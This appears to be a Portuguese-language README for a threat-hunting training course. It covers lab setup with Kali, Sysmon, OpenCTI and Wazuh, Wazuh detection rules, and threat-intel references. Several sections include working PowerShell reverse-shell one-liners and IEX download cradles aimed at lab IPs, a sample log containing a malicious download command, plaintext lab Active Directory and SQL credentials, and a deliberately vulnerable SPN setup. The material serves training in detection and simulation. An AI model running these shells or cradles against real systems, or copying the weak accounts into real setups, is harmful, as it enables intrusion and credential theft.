# THA-ADINT
Repositório de links para o Treinamento Threat Hunting Analist da ADINT School

## Módulo 00

## Download do Virtual Box, Extension Pack, Kali Linux, Metasploitable e ISOS(Windows e Ubuntu)

### VirtualBox Package and Virtual Box Extension Pack
https://www.virtualbox.org/wiki/Downloads

### Kali Download: 
https://www.kali.org/get-kali/#kali-virtual-machines

### Metasploitable:
https://drive.google.com/file/d/1KG-2Qul6-ydfmLlr4ms-VqzUQnJYZWbv/view?usp=sharing

### Windows 10:
https://drive.google.com/file/d/1xJPRTb_9YLlXH51nM1y7DPbda9Xg0fQP/view?usp=sharing

### Ubuntu Server: 
https://ubuntu.com/download/server

## Kali Linux
### Atualização
```
$ sudo su
# apt update
# apt upgrade -y
```
### GoPhish
https://github.com/gophish/gophish
```
$ sudo mkdir /opt/git
$ sudo chown -R kali:kali /opt/git/
$ cd /opt/git
$ git clone https://github.com/gophish/gophish.git
$ cd gophish
$ ls -l
$ sudo apt install golang -y
$ go build
```
### PowerCat
https://github.com/besimorhino/powercat
```
$ mkdir ~/THA/
$ cd ~/THA/
$ wget https://raw.githubusercontent.com/besimorhino/powercat/refs/heads/master/powercat.ps1

IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.101/powercat.ps1'); powercat -c 192.168.56.101 -p 443 -e cmd
```
### Invoke-PowerShellTCP
https://github.com/samratashok/nishang
```
$ cd ~/THA/
$ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1

Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.101 -Port 4444
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/Invoke-PowerShellTcp.ps1')
```

## Windows 10

### Habilitar Monitoramento de Logs do PowerShell
1. Ativar Transcrição de Comandos
Crie um script ou use PowerShell para registrar tudo que for digitado:
```
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value "C:\Logs\PowerShell"
```
Isso criará logs de cada sessão PowerShell em C:\Logs\PowerShell.

2. Habilitar Logging Avançado de ScriptBlock
Esse recurso registra blocos de código malicioso ou suspeito:

```
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force 
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```
​
3. Ativar os Canais de Log no Visualizador de Eventos
Abra o PowerShell como administrador e execute:
```
wevtutil set-log "Microsoft-Windows-PowerShell/Operational" /enabled:true
```

### Instalar e Configurar o Sysmon
1. Baixar o Sysmon:
Acesse: Sysinternals Sysmon 
https://learn.microsoft.com/pt-br/sysinternals/downloads/sysmon

• Extraia o conteúdo em:  `C:\Tools\Sysmon`

2. Usar um Arquivo de Configuração Pronto
Você pode usar o modelo do SwiftOnSecurity:
```
curl -o sysmonconfig.xml https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml
```

3. Instalar o Sysmon com a Configuração
No prompt de comando como administrador:

```
cd C:\Tools\Sysmon
Sysmon64.exe -accepteula -i sysmonconfig.xml
```

4. Verificar se o Sysmon Está Funcionando
Abra o Visualizador de Eventos e vá até:
```
Aplicativos e Serviços > Microsoft > Windows > Sysmon > Operational
```
Você verá eventos como:

• ID 1 – Criação de processo

• ID 3 – Conexões de rede

• ID 11 – Criação de arquivos


### Office 2013
https://drive.google.com/file/d/1fZX_9lmvZ-lJsUxYhuszxLNgR-ewnENQ/view?usp=sharing

## Ubuntu - OpenCTI

### OpenCTI

OpenCTI Docker

https://github.com/OpenCTI-Platform/docker


OpenCTI Documentation - Using Docker


https://docs.opencti.io/latest/deployment/installation/#using-docker


```
$ sudo apt install docker.io
$ sudo apt install docker-compose
$ sudo systemctl start docker
$ sudo mkdir /opt/git
$ sudo chown -R kali:kali /opt/git
$ cd /opt/git
$ git clone https://github.com/OpenCTI-Platform/docker.git
$ cd docker
$ ls -la
$ uuidgen
$ mv .env.sample .env
$ nano .env
$ sudo docker-compose up
$ sudo docker-compose down
```

Exemplo do meu arquivo .env

```
smith@opencti:/opt/git/docker$ cat .env
OPENCTI_ADMIN_EMAIL=admin@opencti.io
OPENCTI_ADMIN_PASSWORD=changeme
OPENCTI_ADMIN_TOKEN=b2a9b21d-2f06-490d-813d-a704a0715c73
OPENCTI_BASE_URL=http://localhost:8080
OPENCTI_HEALTHCHECK_ACCESS_KEY=changeme
MINIO_ROOT_USER=opencti
MINIO_ROOT_PASSWORD=changeme
RABBITMQ_DEFAULT_USER=opencti
RABBITMQ_DEFAULT_PASS=changeme
CONNECTOR_EXPORT_FILE_STIX_ID=3422c5b9-e469-42c3-b7f4-1246d94ca774
CONNECTOR_EXPORT_FILE_CSV_ID=eac57b4f-504a-492a-818b-381a13055d8b
CONNECTOR_EXPORT_FILE_TXT_ID=25bf3113-1e01-4bba-95f7-5ac46716c7d6
CONNECTOR_IMPORT_FILE_STIX_ID=f79fb019-8ac9-430d-a160-43a60563d5bf
CONNECTOR_IMPORT_DOCUMENT_ID=950f837a-fbf7-46af-bb92-009d27614905
CONNECTOR_ANALYSIS_ID=7fa9af46-1b13-4ad4-badb-02dfd0d3a67d
XTM_COMPOSER_ID=c0378cf9-974a-44b8-a639-72f780ebb8ab
SMTP_HOSTNAME=localhost
ELASTIC_MEMORY_SIZE=4G
COMPOSE_PROJECT_NAME=opencti
smith@opencti:/opt/git/docker$
```

Connectors

https://github.com/OpenCTI-Platform/connectors


Connector MITRE

https://github.com/OpenCTI-Platform/connectors/blob/master/external-import/mitre/docker-compose.yml

```
  connector-mitre:
    image: opencti/connector-mitre:rolling
    environment:
      - OPENCTI_URL=http://opencti:8080
      - OPENCTI_TOKEN=${OPENCTI_ADMIN_TOKEN}
      - CONNECTOR_TOKEN=UUID # gerar para alterar
    restart: always
```

Connector Malwarebazaar

https://github.com/OpenCTI-Platform/connectors/blob/master/external-import/malwarebazaar-recent-additions/docker-compose.yml

```
  connector-malwarebazaar-recent-additions:
    image: opencti/connector-malwarebazaar-recent-additions:rolling
    environment:
      - OPENCTI_URL=http://opencti:8080
      - OPENCTI_TOKEN=${OPENCTI_ADMIN_TOKEN}
      - CONNECTOR_ID=UUID # gerar para alterar
      - "CONNECTOR_NAME=MalwareBazaar Recent Additions"
      - CONNECTOR_LOG_LEVEL=error
      - MALWAREBAZAAR_RECENT_ADDITIONS_API_URL=https://mb-api.abuse.ch/api/v1/
      - MALWAREBAZAAR_RECENT_ADDITIONS_API_KEY=SUA_API_KEY # gerar para alterar
      - MALWAREBAZAAR_RECENT_ADDITIONS_COOLDOWN_SECONDS=300 # Time to wait in seconds between subsequent requests
      - MALWAREBAZAAR_RECENT_ADDITIONS_INCLUDE_TAGS=exe,dll,docm,docx,doc,xls,xlsx,xlsm,js # (Optional) Only download files if any tag matches. (Comma separated)
      - MALWAREBAZAAR_RECENT_ADDITIONS_INCLUDE_REPORTERS= # (Optional) Only download files uploaded by these reporters. (Comma separated)
      - MALWAREBAZAAR_RECENT_ADDITIONS_LABELS=malware-bazaar # (Optional) Labels to apply to uploaded Artifacts. (Comma separated)
      - MALWAREBAZAAR_RECENT_ADDITIONS_LABELS_COLOR=#54483b # Color to use for labels
    restart: always
```

Alien Vault

https://github.com/OpenCTI-Platform/connectors/blob/master/external-import/alienvault/docker-compose.yml


Cadastro necessário para obter a OTX Key (API)

https://otx.alienvault.com/

```
version: '3'
services:
  connector-alienvault:
    image: opencti/connector-alienvault:rolling
    environment:
      - OPENCTI_URL=http://opencti:8080
      - OPENCTI_TOKEN=${OPENCTI_ADMIN_TOKEN}
      - CONNECTOR_ID=UUID # gerar para alterar
      - CONNECTOR_NAME=AlienVault
      - CONNECTOR_SCOPE=alienvault
      - CONNECTOR_LOG_LEVEL=error
      - CONNECTOR_DURATION_PERIOD=PT30M # In ISO8601 Format starting with "P" for Period ex: "PT30M" = Period time of 30 minutes
      - ALIENVAULT_BASE_URL=https://otx.alienvault.com
      - ALIENVAULT_API_KEY=SUA_OTX_KEY # gerar para alterar
      - ALIENVAULT_TLP=White
      - ALIENVAULT_CREATE_OBSERVABLES=true
      - ALIENVAULT_CREATE_INDICATORS=true
      - ALIENVAULT_PULSE_START_TIMESTAMP=2022-05-01T00:00:00                  # BEWARE! Could be a lot of pulses!
      - ALIENVAULT_REPORT_TYPE=threat-report
      - ALIENVAULT_REPORT_STATUS=New
      - ALIENVAULT_GUESS_MALWARE=false                                        # Use tags to guess malware.
      - ALIENVAULT_GUESS_CVE=false                                            # Use tags to guess CVE.
      - ALIENVAULT_EXCLUDED_PULSE_INDICATOR_TYPES=FileHash-MD5,FileHash-SHA1  # Excluded Pulse indicator types.
      - ALIENVAULT_ENABLE_RELATIONSHIPS=true                                  # Enable/Disable relationship creation between SDOs.
      - ALIENVAULT_ENABLE_ATTACK_PATTERNS_INDICATES=false                     # Enable/Disable "indicates" relationships between indicators and attack patterns
      - ALIENVAULT_FILTER_INDICATORS=false                                    # Filter indicators by their created datetime
      - ALIENVAULT_INTERVAL_SEC=1800
      - ALIENVAULT_DEFAULT_X_OPENCTI_SCORE=50
      - ALIENVAULT_X_OPENCTI_SCORE_IP=60
      - ALIENVAULT_X_OPENCTI_SCORE_DOMAIN=70
      - ALIENVAULT_X_OPENCTI_SCORE_HOSTNAME=75
      - ALIENVAULT_X_OPENCTI_SCORE_EMAIL=70
      - ALIENVAULT_X_OPENCTI_SCORE_FILE=85
      - ALIENVAULT_X_OPENCTI_SCORE_URL=80
      - ALIENVAULT_X_OPENCTI_SCORE_MUTEX=60
      - ALIENVAULT_X_OPENCTI_SCORE_CRYPTOCURRENCY_WALLET=80
    restart: always
```

Abuse IP DB

https://github.com/OpenCTI-Platform/connectors/blob/master/external-import/abuseipdb-ipblacklist/docker-compose.yml

```
  connector-abuseipdb-ipblacklist:
    image: opencti/connector-abuseipdb-ipblacklist:6.8.2
    environment:
      - OPENCTI_URL=http://opencti:8080
      - OPENCTI_TOKEN=${OPENCTI_ADMIN_TOKEN}
      - CONNECTOR_ID=UUID # gerar para alterar
      - "CONNECTOR_NAME=AbuseIPDB IP Blacklist"
      - CONNECTOR_SCOPE=abuseipdb
      - CONNECTOR_LOG_LEVEL=error
      - ABUSEIPDB_URL=https://api.abuseipdb.com/api/v2/blacklist
      - ABUSEIPDB_API_KEY=SUA_API_KEY # gerar para alterar
      - ABUSEIPDB_SCORE=100
      - ABUSEIPDB_LIMIT=1000000
      - ABUSEIPDB_INTERVAL=1 #Day
    restart: always
```

## Ubuntu - Wazuh

## Configuração da rede via netplan
```
root@wazuh:/home/smith# cat /etc/netplan/50-cloud-init.yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: false
      addresses: [192.168.2.165/24]
      routes:
        - to: default
          via: 192.168.2.1
      nameservers:
        addresses: [192.168.2.1]
    enp0s8:
      dhcp4: false
```

### Wazuh Install
https://wazuh.com/install/

### Wazuh Installation guide
https://documentation.wazuh.com/current/installation-guide/index.html

### Instalação do Wazuh 4.7 via script
```
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh --all-in-one --ignore-check --overwrite
```

### Caso apresente problemas na Instalação do Wazuh 4.7 via script

```
1. Parar os serviços
$ sudo systemctl stop wazuh-agent
$ sudo systemctl stop wazuh-manager

2. Desabilitar os serviços (para não iniciarem no boot)
$ sudo systemctl disable wazuh-agent
$ sudo systemctl disable wazuh-manager

3. Remover os serviços do systemd
$ sudo systemctl reset-failed wazuh-agent
$ sudo systemctl reset-failed wazuh-manager

4. Desinstalar pacotes (dependendo da instalação)
$ sudo apt-get remove --purge wazuh-agent wazuh-manager -y
$ sudo apt-get autoremove -y

5. Remover diretórios residuais
$ sudo rm -rf /var/ossec
$ sudo rm -rf /etc/ossec.conf

6. Reiniciar o Ubuntu Server
$ sudo init 6

7. Repetir a instalação
$ curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh --all-in-one --ignore-check --overwrite

```

##  Passos para Configurar Regras no Wazuh
Criar ou editar um arquivo de regras customizadas
• Caminho padrão no Wazuh Manager:
```
/var/ossec/etc/rules/local_rules.xml
```
​
Adicionar regras para eventos do PowerShell
Exemplo de regra para detectar uso do PowerShell:
```
<group name="windows,powershell,">
  <rule id="100100" level="10">
    <if_sid>61610</if_sid>
    <match>powershell.exe</match>
    <description>Execução do PowerShell detectada</description>
  </rule>
</group>
```
​61610 é o SID padrão para eventos de criação de processo no Windows.

Adicionar regras para eventos do Sysmon
Exemplo para detectar criação de processo (Sysmon Event ID 1):
```
<group name="windows,sysmon,">
  <rule id="100200" level="12">
    <if_sid>61610</if_sid>
    <match>EventID=1</match>
    <match>powershell.exe</match>
    <description>Sysmon - Execução de PowerShell detectada</description>
  </rule>
</group>
```
Você pode adaptar para outros eventos:

• ID 3: Conexões de rede

• ID 11: Criação de arquivos

• ID 13: Alterações de registro


Reiniciar o Wazuh Manager
Após salvar as regras:
```
sudo systemctl restart wazuh-manager
```
​
Verificar se as regras estão funcionando

• Use o dashboard do Wazuh ou o arquivo de log:
```
/var/ossec/logs/alerts/alerts.log
```


## 01 Fundamentos de Threat Hunter

### Turla Group
https://socradar.io/labs/threat-actor/detail//380/Turla%20Group

### Conceitos básicos

Termos de Inteligência Cibernética

- Indicadores de Comprometimento (IoCs): Evidências técnicas de que um sistema foi invadido, como IPs maliciosos, hashes de arquivos, domínios suspeitos.
- TPs (Táticas, Técnicas e Procedimentos): Padrões de comportamento usados por atacantes para executar ataques, como métodos de intrusão, movimentação lateral e exfiltração de dados.
- Actor Profiles: Perfis de grupos ou indivíduos maliciosos, incluindo motivações (financeiras, políticas), capacidades técnicas e histórico de ataques.
- Feeds de Inteligência Cibernética: Fontes automatizadas que fornecem dados atualizados sobre ameaças, como IoCs, TTPs e perfis de atores.


Infraestrutura e Componentes Técnicos

- Domínio: Nome legível associado a um endereço IP, usado para identificar sites na internet.
- URL: Endereço completo que inclui o domínio e o caminho para um recurso específico (ex: https://site.com/pagina).
- Artefatos: Elementos técnicos deixados por um ataque, como arquivos maliciosos, scripts ou logs.
- Payloads: Carga útil de um ataque, geralmente o código malicioso que executa a ação (ex: ransomware).
- Beacons: Sinais enviados por malware para se comunicar com servidores de comando e controle (C2).
- Infraestrutura adversária: Conjunto de recursos usados por atacantes, como servidores, domínios, certificados e ferramentas.


Ferramentas e Técnicas

- LofL (Living off The Land): Técnica em que atacantes usam ferramentas legítimas do sistema (como PowerShell) para evitar detecção.
- PCAP (Packet Capture): Arquivo que armazena pacotes de rede capturados, útil para análise forense.
- Surface Web: Parte da internet acessível por mecanismos de busca comuns.
- Deep Web: Conteúdo não indexado por buscadores, como bancos de dados privados ou páginas protegidas por login.
- Dark Web: Segmento da Deep Web acessível apenas por redes como Tor, onde ocorrem atividades ilícitas.
- Tor: Rede que permite navegação anônima, usada para acessar a Dark Web.
- Crawlers: Bots que exploram sites e redes para coletar dados, usados tanto por buscadores quanto por analistas de segurança.


Regras e Plataformas de Detecção

- SIGMA: Linguagem para criar regras genéricas de detecção de ameaças em logs de eventos.
- YARA: Ferramenta para identificar e classificar arquivos maliciosos com base em padrões.
- SIEM (Security Information and Event Management): Plataforma que coleta, analisa e correlaciona logs de segurança em tempo real.
- EDR (Endpoint Detection and Response): Solução que monitora e responde a ameaças em dispositivos finais (computadores, servidores).
- XDR (Extended Detection and Response): Evolução do EDR que integra dados de múltiplas fontes (rede, e-mail, endpoint) para resposta coordenada.


Itens Complementares para Threat Hunting

- MITRE ATT&CK Framework: Base de conhecimento que categoriza TTPs usados por adversários. Essencial para mapear comportamentos e criar hipóteses de caça.
- C2 (Command and Control): Mecanismos usados por atacantes para controlar sistemas comprometidos. Identificar padrões de C2 é chave para detectar persistência.
- Análise de Logs: Logs de sistema, rede, autenticação e aplicação são fontes primárias para caçadores de ameaças.
- Hunting Hypotheses: Estratégias baseadas em suposições fundamentadas para guiar investigações proativas.
- Anomalias de Comportamento: Detecção de desvios em padrões normais de uso, como horários incomuns de login ou transferências de dados atípicas.
- Threat Intelligence Enrichment: Uso de inteligência externa para contextualizar eventos suspeitos (ex: reputação de IPs, domínios, hashes).
- Memory Forensics: Análise da memória volátil para detectar malware em execução ou artefatos temporários.
- Sandboxing: Execução de arquivos suspeitos em ambiente isolado para observar comportamento malicioso.
- Honeypots: Sistemas armadilhas que simulam vulnerabilidades para atrair e estudar atacantes.
- Técnicas de Evasão: Métodos usados por adversários para evitar detecção, como ofuscação, criptografia ou uso de ferramentas legítimas (LofL).
- Time-Based Analysis: Correlação de eventos com base em cronologia para identificar cadeias de ataque.
- Threat Score / Risk Rating: Classificação de eventos ou artefatos com base em risco potencial.
- Telemetry: Dados coletados de endpoints, rede e aplicações para análise contínua.
- False Positives / Negatives: Avaliação crítica da eficácia das regras de detecção e dos alertas gerados.
- ... to be continue


### APT28 Fancy Bear
https://en.wikipedia.org/wiki/Fancy_Bear

### O grupo APT28 ataca agências governamentais ucranianas através do Signal usando malware
https://csirt.csi.cip.gov.ua/en/posts/apt28-attacks-ukrainian-government-agencies-via-signal-using-malware

### CTIR Gov - Centro de Prevenção, Tratamento e Resposta a Incidentes Cibernéticos de Governo
https://www.gov.br/ctir/pt-br/assuntos/noticias/2023/ameaca-cibernetica-ativa-emotet-e-trickbot

### app do Google
https://myaccount.google.com/apppasswords

### Teste Web
http://testphp.vulnweb.com/login.php

### CTI Report

CTI Report Writing 101
https://kravensecurity.com/cti-report-writing/

APT29 Report
https://blackpointcyber.com/wp-content/uploads/2024/06/Threat-Profile-APT29_Blackpoint-Adversary-Pursuit-Group-APG_2024.pdf

Incident Response Methodologies
https://github.com/certsocietegenerale/IRM/tree/main

ESET Report
https://web-assets.esetstatic.com/wls/en/papers/threat-reports/eset-apt-activity-report-q4-2024-q1-2025.pdf

Mandiant
https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2025/

APT29 Mandiant JSON
https://github.com/thiagosmith/ttps/blob/main/apt.json

### Desafio 2: Mapeamento de TTPs com MITRE ATT&CK - Logs
```
1. Log de e-mail (Phishing inicial)
Fonte: Mail Gateway
Timestamp: 2025-10-04T08:15:23Z  
From: hr@secure-docs[.]org  
To: finance.director@targetcorp.com  
Subject: Atualização de política de benefícios 2025  
Attachment: Benefits_Update_2025.doc  
Verdict: Suspicious macro detected

2. Log de execução de macro (Office)
Fonte: Endpoint EDR
Timestamp: 2025-10-04T08:16:02Z  
Host: FINANCE-PC01  
Process: WINWORD.EXE  
Child Process: powershell.exe  
Command Line: powershell -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://update-sync[.]org/dropper.ps1')"  
Verdict: Malicious PowerShell execution

4. Log de movimentação lateral via SMB
Fonte: Network Sensor (Zeek)
Timestamp: 2025-10-04T08:20:12Z  
Source IP: 10.0.5.21  
Destination IP: 10.0.5.45  
Protocol: SMB  
Action: File transfer – `update.ps1` copied to `\\10.0.5.45\C$\Users\Public\`  
Verdict: Lateral movement suspected

5. Log de exfiltração via HTTP/S
Fonte: Proxy Logs
Timestamp: 2025-10-04T08:25:33Z  
Host: FINANCE-PC01  
Destination: secure-data[.]net  
URL: https://secure-data[.]net/api/upload?session=abc123  
Payload Size: 4.2 MB  
Verdict: Unusual outbound data transfer

6. Log de beaconing (C2)
Fonte: Firewall Logs
Timestamp: 2025-10-04T08:30:00Z  
Source IP: 10.0.5.21  
Destination IP: 182.92.158.231  
Protocol: TCP  
Port: 443  
Frequency: Every 5 minutes  
Verdict: Persistent outbound connection to known APT10 infrastructure
```

### MITRE Navigator
https://mitre-attack.github.io/attack-navigator/

### Invoke-Obfuscation
https://github.com/danielbohannon/Invoke-Obfuscation

### PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
https://iritt.medium.com/an-easy-guide-to-obfuscating-powershell-scripts-with-invoke-obfuscation-6fa3c8626ed3

### NIST Cybersecurity Framework
https://www.nist.gov/cyberframework

### MITRE ATT&CK Framework
https://attack.mitre.org/

### The Diamond Model of Intrusion Analysis
https://apps.dtic.mil/sti/pdfs/ADA586960.pdf

### Cyber Kill Chain
https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html

### The Pyramid of Pain
https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html

## Lab Ambiente Active Directory

### Infomações do dominio

Domain Controller
```
User Local: Administrator:Adint@dc01
Hostname: DC01
Endereço de IP: 192.168.2.222
Endereço de DNS: 192.168.2.222
Nome do Domínio: adint.school
Nome do NetBIOS: adint
Adinistrator:Adint@dominio1
```

File Server
```
User Local: Administrator:Adint@file01
Hostname: FILE01
Endereço de IP: 192.168.2.223
Endereço de DNS: 192.168.2.222
```

MS SQL Server
```
User Local: Administrator:Adint@sql01
Hostname: SQL01
Endereço de IP: 192.168.2.224
Endereço de DNS: 192.168.2.222
```

Unidades Organizacionais:
```
DEV
CTI
ICS
```

Usuários:
```
Administrator:Adint@dominio1
sqluser:3edc#EDC
support:Suporte@123
marcelo:SenhaForte@123
gabriel:SenhaForte@123
andre:Trocar@123
smith:Trocar@123
robson:Adint@1337
jordan:Password1!
danielle:Password1!
milton:Password1!
rayssa:Password1!
```

Grupos:
```
CTIgroup
- jordan
- danielle
- milton
- rayssa

DEVgroup
- sqluser
- support
- robson

ICSgroup
- marcelo
- gabriel
- andre
- smith
```

Políticas de segurança
```
Bloqueio do Windows defender
```

### Instalação do MS SQL Server 2019

Acesso ao banco de dados via Kali Linux
```
$ impacket-mssqlclient sqluser:'3edc#EDC'@192.168.2.224 -windows-auth
```

Criação da base de dados
```
SQL (ADINT\sqluser  dbo@master)> CREATE DATABASE credentials;
```

Listagem das base de dados
```
SQL (ADINT\sqluser  dbo@master)> EXEC sp_databases;
```

Selecionar a base de dados credentials
```
SQL (ADINT\sqluser  dbo@master)> use credentials;
```

Criação da tabela usuários
```
SQL (ADINT\sqluser  dbo@credentials)> CREATE TABLE Usuarios (ID INT PRIMARY KEY, Nome NVARCHAR(50) NOT NULL, Email NVARCHAR(100) NOT NULL UNIQUE, Senha NVARCHAR(100) NOT NULL); INSERT INTO Usuarios (ID, Nome, Email, Senha) VALUES (1,'Ana','ana@cybersec.local','3vF$6IPygnho%'); INSERT INTO Usuarios (ID, Nome, Email, Senha) VALUES (2,'Carlos','carlos@cybersec.local','Q0h&Jc1+CFhYD'); INSERT INTO Usuarios (ID, Nome, Email, Senha) VALUES (3,'Mariana','mariana@cybersec.local','vrhtJh4BSsGn-kD9'); INSERT INTO Usuarios (ID, Nome, Email, Senha) VALUES (4,'Pedro','pedro@cybersec.local','S9eZVAd2$gA&3u'); INSERT INTO Usuarios (ID, Nome, Email, Senha) VALUES (5,'Camila','camila@cybersec.local','rXgbV98#E@jX'); INSERT INTO Usuarios (ID, Nome, Email, Senha) VALUES (6,'Rafael','rafael@cybersec.local','Apua%HjVhS@vu3Wq'); INSERT INTO Usuarios (ID, Nome, Email, Senha) VALUES (7,'Beatriz','beatriz@cybersec.local','-RdI+V6b7#5XQ'); INSERT INTO Usuarios (ID, Nome, Email, Senha) VALUES (8,'Lucas','lucas@cybersec.local','LKk5L$TuVHecxTk'); INSERT INTO Usuarios (ID, Nome, Email, Senha) VALUES (9,'Juliana','juliana@cybersec.local','#%BhyEMK@L30mW'); INSERT INTO Usuarios (ID, Nome, Email, Senha) VALUES (10,'Felipe','felipe@cybersec.local','H#NM8$P+Ffo*Xr');
```

Listagem das Tabelas
```
SQL (ADINT\sqluser  dbo@credentials)> SELECT name FROM sys.tables;
```

Consulta de dados
```
SQL (ADINT\sqluser  dbo@credentials)> SELECT * FROM Usuarios;
```

### Implantação do Serviço SPN vulnerável
```
setspn -a DC01/sqluser.adint.school adint\sqluser
setspn -T adint.school -Q */*
```
